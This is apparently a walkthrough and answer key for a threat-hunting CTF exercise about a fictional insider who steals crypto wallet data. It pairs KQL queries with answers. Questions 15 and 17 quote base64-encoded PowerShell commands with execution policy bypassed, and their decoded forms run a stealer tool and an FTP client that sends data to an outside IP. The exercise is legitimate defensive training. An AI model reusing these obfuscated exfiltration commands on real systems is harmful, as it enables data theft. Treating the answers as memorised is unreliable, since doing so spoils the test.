garkeg## Inside Encryptodera: An Insider Threat Scenario: 4: A Network Mystery<br>
### **Summary**<br>
⚠️ This section is a little bit more of a challenge. You got this! 💪
<br><br>
Encrytodera has decided to switch from Email to Tiktok as their primary work communication platform. That's right, all communications in the future of Encryptodera will be recorded in 12 second videos - complete with fun dances 💃🏻.
<br><br>
In order to make sure there is enough bandwidth for this transition, the network administrator was tasked to do some research to see how much more traffic the network could handle without failing (tiktoks take a lot of bandwith you know!).
<br><br>
During this debugging process, he noticed an unusually large amount of data being sent to one IP address on February 5th
<br><br>

**Q1. Which IP address received the largest amount of data on Feb 5th?**<br><br>

```
NetworkFlow
| where timestamp >= datetime(02/05/2024)
| where timestamp < datetime(02/06/2024)
```
<br>

**Answer: 182.56.23.121**<br><br>



**Q2. How many bytes of data were sent to that IP on the 5th?**<br><br>
From previous query.<br><br>

**Answer: 12,716**<br><br>

**Q3. When was data first sent to this IP? (paste the full timestamp)**<br><br>

```
NetworkFlow
| where dest_ip == "182.56.23.121"
```
<br>

**Answer: 1/21/2024, 1:28:33 PM**<br><br>

**Q4. On how many distinct days have we sent data to this IP?**<br><br>
Using query in question 3.<br><br>

**Answer: 27**<br><br>

**Q5. What service is used for the port to which this data is being transferred?**<br><br>
Port Number (dest_port) 21 is for FTP.<br><br>

**Answer: FTP**<br><br>

**Q6. What is the total amount of data transferred to this IP address?**<br><br>

```
NetworkFlow
| where dest_ip == "182.56.23.121"
| summarize sum(bytes)
```
<br>

**Answer: 208,138**<br><br>

**Q7. How many distinct employees have sent data to this IP address?**<br><br>

```
NetworkFlow
| where dest_ip == "182.56.23.121"
| distinct src_ip
```
<br>

**Answer: 1**<br><br>

**Q8. Whose name is linked to that IP address? Provide the employee's name.**<br><br>
Take the src_ip from previous query and run it in the employee table.<br><br>

```
Employees
| where ip_addr == "10.10.0.2"
```
<br>

**Answer: Jane Smith**<br><br>

**Q9. What is that employee's role?**<br><br>
Using previous query.<br><br>

**Answer: Cryto Bruh (Blockchain Contractor)**<br><br>

**Q10. We see her looking for the location of the company's __ __ __ __ (4 words)**<br><br>

```
InboundNetworkEvents
| where url contains "encryptoderafinancial"
| where url contains "location"
| where src_ip == "10.10.0.2"
```
<br>
The first result that comes back.<br>

```
https://encryptoderafinancial.com/search=Location+of+company%27s+cold+storage+crypto+wallets
```
<br>

**Answer: cold storage crypto wallets**<br><br>

**Q11. Who was Jane having a suspicious conversation with? (email address)**<br><br>

```
Email
| where sender == "jane_smith@encryptoderafinancial.com"
```
<br>
Searching through subject lines in the emails. One subject line is of interest.<br><br>

```
I have infiltrated the company 👀
```
<br>

**Answer: elboss@westealurcrypto.com**<br><br>

**Q12. What IP address did the boss man provide to help with smuggling the data?**<br><br>

```
Email
| where recipient == "jane_smith@encryptoderafinancial.com" 
| where sender == "elboss@westealurcrypto.com"
```
<br>
The second result.<br><br>

```
[EXTERNAL]🔐 FTP Server IP: 182.56.23.121
```
<br>

**Answer: 182.56.23.121**<br><br>

**Q13. What is the name of the data exfil tool Jane downloads to help with her operation?**<br><br>

```
FileCreationEvents
| where username contains "jasmith"
| where path contains "Download"
```
<br>

First result that is returned.<br><br>

```
C:\\Users\\jasmith\\Downloads\\ftp_client.exe
```
<br>

**Answer: ftp_client.exe**<br><br>

**Q14. What is the name of the crypto theft tool Jane downloads to help with her operation?**<br><br>
From previous query, the second result.<br><br>

```
C:\\Users\\jasmith\\Downloads\\crypto_stealer.exe
```
<br>

**Answer: crypto_stealer.exe**<br><br>

**Q15. To what path does Jane point her data exfiltration tool?**<br><br>
The exfiltration tool was downloaded at 1/21/2024, 12:36:03 PM. The first exfiltrated data happened at 1/21/2024, 1:28:33 PM. So somewhere in between those times, Jane used the exfiltration tool.
<br>

```
ProcessEvents
| where timestamp >= datetime(1/21/2024, 12:36:03 PM)
| where timestamp <= datetime(1/21/2024, 1:28:33 PM)
| where username == "jasmith"
```
<br>

The first result that is returned.<br><br>

```
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc Y3J5cHRvX3N0ZWFsZXIuZXhlIC0tZGFpbHkgLS1pbnB1dCBcXFxcTmV0d29ya1NoYXJlXFxjcml0aWNhbF9pbmZyYXN0cnVjdHVyZVxcQ3J5cHRvX1dhbGxldF9TdG9yYWdlX0xvY2F0aW9uc1xcIC0tb3V0cHV0IEM6XFxVc2Vyc1xcamFzbWl0aFxcVG9UaGVNb29uXFw=
```
<br>

Decrypt the Base64 string in cyberchef.<br><br>

```
crypto_stealer.exe --daily --input \\\\NetworkShare\\critical_infrastructure\\Crypto_Wallet_Storage_Locations\\ --output C:\\Users\\jasmith\\ToTheMoon\\
```
<br>

**Answer: C:\\Users\\jasmith\\ToTheMoon\\;tothemoon**<br><br>

**Q16. At what tempo does she set the tool to run? (one word)**<br><br>
Second result from previous query.<br><br>
From the previous query, the frequency is stated.<br><br>

**Answer: daily**<br><br>

**Q17. What password does Jane use for the tool?**<br><br>
The second result from query in question 15.<br><br>

```
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAnXFxub29NZWhUb1RcXGh0aW1zYWpcXHNyZXNVXFw6QyBodGFwLS0gMTIxLjMyLjY1LjI4MSBwaS0tIDEyIHRyb3AtLSAibW9jLmxhaWNuYW5pZmFyZWRvdHB5cmNuZSIgbWl0Y2l2LS0gNURONEhydUZGMHRpM2s0dGxsM3dPVFlSQ2hjdW0ydG9nVSBzc2FwLS0gaHRpbXNhaiByZXN1LS0geWxpYWQtLSBleGUudG5laWxjX3B0ZicgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
```
<br>

Decrypt the Base64 string in cyberchef.<br><br>

```
( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''
```
<br>

Reverse the string.<br><br>

```
'' nioj- )}]0[_${% | '' tilps- 'ftp_client.exe --daily --user jasmith --pass Ugot2muchCRYTOw3llt4k3it0FFurH4ND5 --victim "encryptoderafinancial.com" --port 21 --ip 182.56.23.121 --path C:\\Users\\jasmith\\ToTheMoon\\' (
```
<br>


**Answer: Ugot2muchCRYTOw3llt4k3it0FFurH4ND5**<br><br>
